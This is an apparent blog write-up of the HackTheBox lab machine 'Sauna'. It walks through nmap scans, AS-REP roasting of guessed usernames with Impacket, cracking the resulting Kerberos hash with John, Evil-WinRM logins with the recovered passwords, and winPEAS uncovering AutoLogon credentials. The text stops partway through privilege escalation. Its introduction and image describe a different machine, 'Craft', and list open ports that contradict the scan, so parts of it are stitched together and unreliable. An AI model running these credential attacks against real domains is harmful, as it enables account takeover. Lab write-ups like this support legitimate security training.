Title:HTB: Sauna
Date: xx-05-2020 10:35
category:security
tags:security, boot2root, HTB,
meta:security, boot2root, HTB,

<img class="align-left" src="/media/2020.01/craft_card.png" alt="Craft card" width="262">


This is a writeup about a retired HacktheBox machine:
[Craft](https://www.hackthebox.eu/home/machines/profile/197)
This box is classified as a medium machine. The user part is quit long and
involve to find "secrets" in a git repository, access an API to get a
reverse shell and manipulate a MySQL database in a jailed environment. The root
part is quit easier and involve to interact with a vault instance.

<!-- PELICAN_END_SUMMARY -->

[TOC]

# User

## Recon

We start with an nmap scan. Only the ports 22, 6022 (SSH) and 443 (HTTPS) are open.

    :::text
    # Nmap 7.80 scan initiated Mon Feb 17 08:29:26 2020 as: nmap -p- -sS -oN nmap_ss 10.10.10.175
    Nmap scan report for 10.10.10.175
    Host is up (0.27s latency).
    Not shown: 65515 filtered ports
    PORT      STATE SERVICE
    53/tcp    open  domain
    80/tcp    open  http
    88/tcp    open  kerberos-sec
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    389/tcp   open  ldap
    445/tcp   open  microsoft-ds
    464/tcp   open  kpasswd5
    593/tcp   open  http-rpc-epmap
    636/tcp   open  ldapssl
    3268/tcp  open  globalcatLDAP
    3269/tcp  open  globalcatLDAPssl
    5985/tcp  open  wsman
    9389/tcp  open  adws
    49667/tcp open  unknown
    49669/tcp open  unknown
    49670/tcp open  unknown
    49671/tcp open  unknown
    49681/tcp open  unknown
    57381/tcp open  unknown

    # Nmap done at Mon Feb 17 08:43:53 2020 -- 1 IP address (1 host up) scanned in 867.44 seconds

Version:

    :::text
    # Nmap 7.80 scan initiated Mon Feb 17 08:45:29 2020 as: nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49669,49670,49671,49681,57381 -sSV -oN nmap_ssv 10.10.10.175
    Nmap scan report for 10.10.10.175
    Host is up (0.31s latency).

    PORT      STATE SERVICE       VERSION
    53/tcp    open  domain?
    80/tcp    open  http          Microsoft IIS httpd 10.0
    88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-02-17 21:45:22Z)
    135/tcp   open  msrpc         Microsoft Windows RPC
    139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
    445/tcp   open  microsoft-ds?
    464/tcp   open  kpasswd5?
    593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp   open  tcpwrapped
    3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
    3269/tcp  open  tcpwrapped
    5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    9389/tcp  open  mc-nmf        .NET Message Framing
    49667/tcp open  msrpc         Microsoft Windows RPC
    49669/tcp open  msrpc         Microsoft Windows RPC
    49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    49671/tcp open  msrpc         Microsoft Windows RPC
    49681/tcp open  msrpc         Microsoft Windows RPC
    57381/tcp open  msrpc         Microsoft Windows RPC
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.80%I=7%D=2/17%Time=5E4A9906%P=x86_64-pc-linux-gnu%r(DNSV
    SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
    SF:x04bind\0\0\x10\0\x03");
    Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Mon Feb 17 08:48:06 2020 -- 1 IP address (1 host up) scanned in 156.46 seconds

## Web

Get the teams member, put them in a file. Guess some naming convention

    :::text
    fergus.smith
    hugo.bear
    steven.kerb
    shaun.coins
    bowie.taylor
    sophie.driver
    fsmith
    hbear
    skerb
    scoins
    btaylor
    sdriver
    fesmith
    hubear
    stkerb
    shcoins
    botaylor
    sodriver

    :::text
    python GetNPUsers.py  -dc-ip 10.10.10.175  egotisticalbank/ -usersfile ~/pentest/htb_sauna/users
    Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation

    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    $krb5asrep$23$fsmith@EGOTISTICALBANK:7737b8e55d1ac7976a01e619a1268567$268f28ec59cfeda91a139f8f8c2c5cb9679d0dc04ba133f031b3021ebbd203888cd12633a0e604ad28420ff3fe41694d38f55b434bbe2af2b7ee0958a9a5705e4a880e2ecebb74a4d1aca73371cfcb73fb54a61520392d76079cc32bf3e128b87e3450d68361a84b4c686104e2fe13dc3cd7bd381a5ac87737ab8b95908bf0be409c7642fcfac3599aca04d19fd0f25f7bb4908a6fb496975f68ee3a4761ca406a43502b86410774127f25a5dc14c76dde7ac458df451dbcb093c4c6d069406e98c4839ecd6a0952a0850c289fab93e29682ec64cb690add83d0c6986c8f078bf25e53662f7d7fcc2c1e4740554036218a71320da2067a1298
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
    [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)



    :::text
    john hash -w=tools/password_lists/rockyou.txt
    Warning: detected hash type "krb5asrep", but the string is also recognized as "krb5asrep-aes-opencl"
    Use the "--format=krb5asrep-aes-opencl" option to force loading these as that type instead
    Using default input encoding: UTF-8
    Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
    Will run 4 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICALBANK)
    1g 0:00:00:19 DONE (2020-02-17 15:33) 0.05235g/s 551780p/s 551780c/s 551780C/s Thines..Thehulk2008
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed


    :::text
    ruby evil-winrm.rb -u fsmith -i 10.10.10.175 -p 'Thestrokes23'

    Evil-WinRM shell v1.8

    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\FSmith\Documents> cat ../Desktop/user.txt
    1b5520b98d97cf17f24122a55baf70cf

## Getting root

    :::text
    *Evil-WinRM* PS C:\Users\FSmith\Documents> ls


        Directory: C:\Users\FSmith\Documents


    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----        2/17/2020  10:17 AM         227840 winPEAS.exe

    *Evil-WinRM* PS C:\Users\FSmith\Documents> download winPEAS.exe /tmp/peas
    Info: Downloading winPEAS.exe to /tmp/peas

    Info: Download successful!

    *Evil-WinRM* PS C:\Users\FSmith\Documents> net user

    User accounts for \\

    -------------------------------------------------------------------------------
    Administrator            FSmith                   Guest
    HSmith                   krbtgt                   svc_loanmgr
    The command completed with one or more errors.

We run https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

  :::text
  [+] Looking for AutoLogon credentials(T1012)
Some AutoLogon credentials were found!!
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

ruby evil-winrm.rb -u svc_loanmgr -i 10.10.10.175 -p 'Moneymakestheworldgoround!'

Evil-WinRM shell v1.8

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc_loanmgr\Documents> 

